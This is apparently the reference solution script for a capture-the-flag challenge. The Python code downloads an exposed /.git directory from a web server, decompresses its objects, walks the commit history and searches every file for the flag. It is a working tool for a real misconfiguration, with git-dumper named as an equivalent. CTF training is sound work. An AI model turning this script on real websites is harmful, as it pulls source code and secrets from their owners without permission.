#!/usr/bin/env python3
"""Reference solve: walk the exposed /.git object graph and grep every blob for the flag.

Usage: python3 solve.py http://localhost:8080
(Equivalent to: git-dumper http://host/.git out && cd out && git log -p | grep CTF)
"""
import re
import sys
import urllib.request
import zlib

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"


def get(path):
    with urllib.request.urlopen(f"{BASE}/.git/{path}") as r:
        return r.read()


def obj(sha):
    raw = zlib.decompress(get(f"objects/{sha[:2]}/{sha[2:]}"))
    header, _, body = raw.partition(b"\0")
    return header.split()[0].decode(), body


def tree_entries(body):
    i = 0
    while i < len(body):
        sp = body.index(b" ", i)
        nul = body.index(b"\0", sp)
        yield body[sp + 1:nul].decode(), body[nul + 1:nul + 21].hex()
        i = nul + 21


head = get("HEAD").decode().strip()
sha = get(head.split(": ")[1]).decode().strip() if head.startswith("ref:") else head
print(f"[+] HEAD -> {sha}")

seen = set()
todo = [sha]
while todo:
    sha = todo.pop()
    if sha in seen:
        continue
    seen.add(sha)
    kind, body = obj(sha)
    if kind == "commit":
        text = body.decode()
        print(f"[+] commit {sha[:8]}: {text.split(chr(10) * 2, 1)[1].strip()}")
        todo += re.findall(r"^(?:tree|parent) ([0-9a-f]{40})", text, re.M)
    elif kind == "tree":
        todo += [s for _, s in tree_entries(body)]
    elif kind == "blob":
        m = re.search(rb"CTF\{[^}]+\}", body)
        if m:
            print(f"\n[!] FLAG: {m.group().decode()}")
            sys.exit(0)

print("[-] flag not found")
sys.exit(1)
